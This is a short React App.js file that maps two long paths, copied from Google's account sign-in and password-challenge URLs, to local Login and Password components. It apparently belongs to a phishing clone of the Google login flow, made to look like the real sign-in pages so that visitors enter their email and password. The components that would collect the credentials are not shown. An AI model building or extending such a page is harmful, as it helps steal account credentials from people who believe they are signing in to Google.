import './App.css';
import React from "react";
import Login from "./Login";
import Password from "./Password";
import { BrowserRouter as Router, Route, Routes} from "react-router-dom";

function App() {
  return (
    <div className="App">
      <Router>
      <Routes>
        <Route path="/v3/signin/identifierauthuser0continuehttps3A2F2Fmyaccount.google.com2F3Futmsource3Dsigninnocontinue26pli3D1ecGAlAwAEflowEntryAddSessionflowNameGlifWebSignInhlenGB&serviceaccountsettingsthemeglifdshS16448581093A1706398668419936" element={
          <React.Fragment>
            <Login/>
          </React.Fragment>
        }/>
        <Route path="/v3/signin/challenge/pwdTLAHNYTISLBQdq1oPINH30XKmymic4TxfHWG80GkvYGRDZgh4Wc7YUetmg7Nx2U&checkConnectionyoutube3A591checkedDomainsyoutubecid1continuehttps3A2F2Fmyaccount.google.com2F3Futmsource3Dsigninnocontinue26pli3D1dshS16448581093A1706398668419936ecGAlAwAEflowEntryAddSessionflowNameGlifWebSignInhlenGBpstMsg1serviceaccountsettingsthemeglifauthuser0" element={
          <React.Fragment>
            <Password/>
          </React.Fragment>
        }/>
      </Routes>
      </Router>
      
    </div>
  );
}

export default App;
